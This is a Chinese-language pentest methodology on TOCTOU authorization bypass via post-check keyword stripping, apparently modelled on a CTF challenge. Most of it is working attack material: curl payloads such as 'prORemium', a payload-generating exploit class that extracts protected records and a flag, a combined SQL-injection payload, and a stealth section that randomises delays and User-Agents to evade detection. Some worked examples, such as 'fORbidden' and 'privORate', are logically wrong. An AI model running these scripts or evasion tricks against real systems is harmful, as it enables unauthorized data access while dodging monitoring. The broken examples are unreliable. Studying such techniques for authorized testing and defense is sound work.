# TOCTOU 授权绕过技术方法论

---

# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化的 TOCTOU（Time-of-Check-Time-of-Use）授权绕过技术检测与利用流程，帮助发现和利用因检查与使用之间状态变化导致的访问控制漏洞。

## 1.2 适用范围

本文档适用于以下场景：
- 授权检查在使用输入之前执行
- 输入在检查后被转换或修改
- 多阶段处理流程中状态可能变化
- 文件操作、参数验证等场景

## 1.3 读者对象

本文件主要面向执行渗透测试任务的安全工程师、安全分析师。

---

# 第二部分：核心渗透技术专题

## 2.1 技术介绍

### 漏洞原理

TOCTOU（Time-of-Check-Time-of-Use）授权绕过是指应用程序在检查用户输入时验证了一个值，但在实际使用该输入时，值已经被转换或修改，导致检查失效的漏洞。

**本质问题**：
- 检查点（Check）和使用点（Use）之间存在状态变化
- 输入在检查后被转换、过滤或处理
- 缺少原子性操作
- 未在使用前重新验证

### 常见 CWE 映射

| CWE 编号 | 描述 |
|---------|------|
| CWE-367 | TOCTOU 竞态条件 |
| CWE-287 | 身份验证不当 |
| CWE-693 | 保护机制失效 |

## 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 输入过滤后查询 | 搜索/筛选功能 | 过滤前检查，过滤后查询 |
| 文件名处理 | 文件上传/下载 | 检查后修改文件名 |
| 权限验证 | 资源访问控制 | 验证后状态变化 |
| 参数 sanitization | API 参数处理 | sanitization 改变参数值 |
| CTF 挑战应用 | 数据访问控制 | 故意设计的 TOCTOU 场景 |

## 2.3 漏洞探测方法

### 2.3.1 代码审计识别

**危险模式识别**：

```python
# ❌ 危险模式 1：检查后转换
def process_request(user_input):
    # Check: 检查原始输入
    if user_input == 'forbidden_value':
        return "Access denied"
    
    # Transformation: 转换输入
    processed_input = user_input.replace('OR', '')
    
    # Use: 使用转换后的值
    query = f"SELECT * FROM data WHERE type = '{processed_input}'"
    return execute_query(query)

# ❌ 危险模式 2：多次处理
def handle_request(param):
    # Check 1: 第一次检查
    if param == 'admin':
        reject()
    
    # Transform 1: 第一次转换
    param = param.lower()
    
    # Check 2: 第二次检查（可能冗余）
    if 'select' in param:
        reject()
    
    # Transform 2: 第二次转换
    param = param.strip()
    
    # Use: 使用最终值
    execute(param)
```

**审计关键词**：
- `.replace()` 在验证后调用
- 多个处理阶段
- 输入转换函数
- 检查与查询之间的代码

### 2.3.2 黑盒测试方法

**步骤 1：确定检查点**

```bash
# 测试直接访问被禁止的值
curl -X POST http://target.com/jobs \
  -H "Content-Type: application/json" \
  -d '{"job_type": "premium"}'

# 如果返回 403，说明存在检查
# Response: {"detail": "Access denied"}
```

**步骤 2：识别转换逻辑**

```bash
# 测试输入被如何转换
curl -X POST http://target.com/jobs \
  -H "Content-Type: application/json" \
  -d '{"job_type": "ORtest"}'

# 检查响应，看 OR 是否被移除

# 系统化测试转换规则
keywords=("OR" "or" "AND" "and" "SELECT" "select" "UNION" "union")

for kw in "${keywords[@]}"; do
    response=$(curl -s -X POST http://target.com/jobs \
      -H "Content-Type: application/json" \
      -d "{\"job_type\": \"${kw}test\"}")
    echo "$kw: $response"
done
```

**步骤 3：构造 TOCTOU Payload**

```bash
# 基于转换规则构造 Payload
# 如果 'OR' 被移除，尝试 'prORemium'

curl -X POST http://target.com/jobs \
  -H "Content-Type: application/json" \
  -d '{"job_type": "prORemium"}'

# 预期结果：
# Check: 'prORemium' != 'premium' → 通过
# Transform: 'prORemium' → 'premium' (移除 OR)
# Use: 查询 premium 数据
```

### 2.3.3 自动化检测脚本

```python
#!/usr/bin/env python3
"""
TOCTOU 授权绕过检测脚本
"""

import requests
import json

BASE_URL = 'http://target.com/jobs'
FORBIDDEN_VALUE = 'premium'

def detect_toctou():
    """检测 TOCTOU 漏洞"""
    
    # 步骤 1：确认直接访问被禁止
    print("[*] Step 1: Confirming direct access is blocked...")
    response = requests.post(
        BASE_URL,
        json={'job_type': FORBIDDEN_VALUE},
        headers={'Content-Type': 'application/json'}
    )
    
    if response.status_code == 403:
        print(f"[+] Confirmed: Direct access to '{FORBIDDEN_VALUE}' is blocked")
    else:
        print(f"[-] Direct access not blocked, trying alternative methods...")
        return False
    
    # 步骤 2：识别过滤关键词
    print("\n[*] Step 2: Identifying filter keywords...")
    filter_keywords = []
    
    test_keywords = ['OR', 'or', 'AND', 'and', 'SELECT', 'select', 'UNION', 'union']
    
    for kw in test_keywords:
        test_input = f"{kw}test"
        response = requests.post(
            BASE_URL,
            json={'job_type': test_input},
            headers={'Content-Type': 'application/json'}
        )
        
        # 检查响应中是否包含原关键词
        if kw not in response.text:
            filter_keywords.append(kw)
            print(f"  [FILTERED] {kw}")
        else:
            print(f"  [ALLOWED] {kw}")
    
    # 步骤 3：构造 TOCTOU Payload
    print(f"\n[*] Step 3: Constructing TOCTOU payloads...")
    
    for kw in filter_keywords:
        # 将关键词嵌入禁止值中
        for i in range(len(FORBIDDEN_VALUE) + 1):
            payload = FORBIDDEN_VALUE[:i] + kw + FORBIDDEN_VALUE[i:]
            
            response = requests.post(
                BASE_URL,
                json={'job_type': payload},
                headers={'Content-Type': 'application/json'}
            )
            
            if response.status_code == 200:
                data = response.json()
                # 检查是否返回了禁止的数据
                if any(FORBIDDEN_VALUE in str(item) for item in data):
                    print(f"  [SUCCESS] Payload: {payload}")
                    print(f"           Response: {data}")
                    return True
    
    print("  [FAILED] No working TOCTOU payload found")
    return False

if __name__ == '__main__':
    if detect_toctou():
        print("\n[SUCCESS] TOCTOU vulnerability confirmed!")
    else:
        print("\n[FAILED] Could not confirm TOCTOU vulnerability")
```

## 2.4 漏洞利用方法

### 2.4.1 基础 TOCTOU 绕过

**场景**：授权检查在输入 sanitization 之前执行

```python
# 目标应用代码
def jobs_endpoint(job_type):
    # Line 45: Authorization check on RAW input
    if job_type and job_type == 'premium':
        return 403, {"detail": "Access denied"}
    
    # Lines 49-50: Sanitization AFTER authorization
    for word in ['OR', 'or', 'AND', 'and', 'SELECT', 'select']:
        job_type = job_type.replace(word, '')
    
    # Line 53: Query uses TRANSFORMED value
    query = f"SELECT * FROM jobs WHERE type = '{job_type}'"
    return execute_query(query)
```

**利用 Payload**：

```bash
# Payload 1：嵌入 'OR'
curl -X POST http://target.com/jobs \
  -H "Content-Type: application/json" \
  -d '{"job_type": "prORemium"}'

# 执行流程：
# 1. Check: 'prORemium' == 'premium'? → False (BYPASS)
# 2. Transform: 'prORemium' → 'premium' (移除 'OR')
# 3. Use: SELECT * FROM jobs WHERE type = 'premium'

# Payload 2：嵌入 'AND'
curl -X POST http://target.com/jobs \
  -H "Content-Type: application/json" \
  -d '{"job_type": "prANDemium"}'

# Payload 3：多个位置嵌入
curl -X POST http://target.com/jobs \
  -H "Content-Type: application/json" \
  -d '{"job_type": "privORate"}'
```

### 2.4.2 完整利用脚本

```python
#!/usr/bin/env python3
"""
TOCTOU 授权绕过利用脚本
提取受保护资源
"""

import requests
import json

BASE_URL = 'http://target.com/jobs'
FORBIDDEN_VALUE = 'premium'
FILTER_KEYWORDS = ['OR', 'or', 'AND', 'and', 'SELECT', 'select', 'UNION', 'union', 'FROM', 'from', 'WHERE', 'where']

class TOCTOUExploit:
    def __init__(self):
        self.session = requests.Session()
    
    def generate_payloads(self):
        """生成 TOCTOU Payloads"""
        payloads = []
        
        for kw in FILTER_KEYWORDS:
            # 在禁止值的不同位置嵌入关键词
            for i in range(len(FORBIDDEN_VALUE) + 1):
                payload = FORBIDDEN_VALUE[:i] + kw + FORBIDDEN_VALUE[i:]
                payloads.append(payload)
        
        return payloads
    
    def test_payload(self, payload):
        """测试单个 Payload"""
        response = self.session.post(
            BASE_URL,
            json={'job_type': payload},
            headers={'Content-Type': 'application/json'}
        )
        
        if response.status_code == 200:
            data = response.json()
            if data and len(data) > 0:
                return True, data
        return False, None
    
    def extract_protected_data(self):
        """提取受保护数据"""
        print("[*] Generating TOCTOU payloads...")
        payloads = self.generate_payloads()
        print(f"[*] Generated {len(payloads)} payloads")
        
        print("\n[*] Testing payloads...")
        for payload in payloads:
            success, data = self.test_payload(payload)
            
            if success:
                print(f"\n[SUCCESS] Payload: {payload}")
                print(f"[*] Extracted data:")
                for record in data:
                    print(f"    {record}")
                return data
        
        print("\n[FAILED] No payload worked")
        return None
    
    def extract_flag(self):
        """专门提取 Flag"""
        data = self.extract_protected_data()
        
        if data:
            for record in data:
                desc = record.get('description', '')
                if 'flag{' in desc.lower():
                    print(f"\n[SUCCESS] Flag: {desc}")
                    return desc
        
        return None

if __name__ == '__main__':
    exploit = TOCTOUExploit()
    
    print("[*] Starting TOCTOU authorization bypass attack...\n")
    
    # 提取受保护数据
    data = exploit.extract_protected_data()
    
    # 提取 Flag
    flag = exploit.extract_flag()
    if flag:
        print(f"\n[+] Captured Flag: {flag}")
```

### 2.4.3 多关键词组合

```bash
# 当单个关键词不够时，尝试组合

# Payload：使用多个关键词
curl -X POST http://target.com/jobs \
  -H "Content-Type: application/json" \
  -d '{"job_type": "prORANDemium"}'

# 执行流程：
# 1. Check: 'prORANDemium' != 'premium' → 通过
# 2. Transform: 'prORANDemium' → 'prANDemium' → 'premium'
# 3. Use: 查询 premium 数据
```

### 2.4.4 结合 SQL 注入

**场景**：TOCTOU 绕过 + SQL 注入组合利用

```bash
# Payload：同时利用 TOCTOU 和 SQL 注入
curl -X POST http://target.com/jobs \
  -H "Content-Type: application/json" \
  -d '{"job_type": "'"'"' oR type='premium'--"}'

# 执行流程：
# 1. Check: 不是精确的 'premium' → 通过
# 2. Transform: 'oR' 不在黑名单（大小写敏感）→ 不变
# 3. Use: SQL 注入执行
```

## 2.5 漏洞利用绕过方法

### 2.5.1 绕过多次检查

**场景**：应用有多个检查点

```python
# 目标代码
def process(input_val):
    # Check 1
    if input_val == 'forbidden':
        reject()
    
    # Transform 1
    input_val = input_val.replace('OR', '')
    
    # Check 2
    if 'forbidden' in input_val:
        reject()
    
    # Transform 2
    input_val = input_val.lower()
    
    # Use
    execute(input_val)
```

**绕过方法**：

```bash
# Payload：嵌套关键词
# 输入：fORbidden
# Check 1: 'fORbidden' != 'forbidden' → 通过
# Transform 1: 'fORbidden' → 'fbidden' (移除 OR)
# Check 2: 'forbidden' not in 'fbidden' → 通过
# Transform 2: 'fbidden' → 'fbidden'

# 需要找到正确的嵌入位置
curl -X POST http://target.com/process \
  -d "input=fORbidden"
```

### 2.5.2 绕过递归过滤

```bash
# 当过滤器递归执行时
# 输入：UNUNIONION
# 第一遍：UNUNIONION → UNION
# 第二遍：UNION → (空)

# 需要使用不会被完全过滤的关键词
# 如：'prORemium' → 'premium'（只移除一次）
```

### 2.5.3 隐蔽测试技巧

```python
# 降低测试频率避免检测
import time
import random

def stealth_test(payloads):
    for payload in payloads:
        # 随机延迟
        time.sleep(random.uniform(2, 5))
        
        # 随机 User-Agent
        headers = {'User-Agent': get_random_ua()}
        
        # 执行测试
        response = requests.post(
            BASE_URL,
            json={'job_type': payload},
            headers=headers
        )
```

---

# 第三部分：附录

## 3.1 TOCTOU 检测检查清单

```
□ 识别所有输入验证点
□ 确定输入转换/过滤逻辑
□ 检查验证与使用之间的代码
□ 测试嵌入关键词的绕过
□ 测试大小写变化
□ 测试嵌套关键词
□ 测试多阶段处理流程
□ 测试文件操作竞态条件
```

## 3.2 常见 TOCTOU 模式

| 模式 | 描述 | 利用方法 |
|-----|------|---------|
| 验证后过滤 | 先验证后过滤 | 嵌入过滤关键词 |
| 多次转换 | 多个转换阶段 | 利用转换差异 |
| 文件竞态 | 检查后使用文件 |  symlink 攻击 |
| 状态变化 | 检查后状态改变 | 并发请求 |

## 3.3 修复建议

1. **原子性操作** - 检查和使用在同一操作中完成
2. **使用后验证** - 在使用前再次验证
3. **避免转换** - 不要修改已验证的输入
4. **白名单验证** - 只允许预期值
5. **参数化查询** - 避免 SQL 注入

---

**参考资源**：
- [OWASP Top 10:2025 A01 Broken Access Control](https://owasp.org/Top10/2025/A01_2025-Broken_Access_Control/)
- [CWE-367: TOCTOU Race Condition](https://cwe.mitre.org/data/definitions/367.html)
- [PortSwigger - Access Control Vulnerabilities](https://portswigger.net/web-security/access-control)
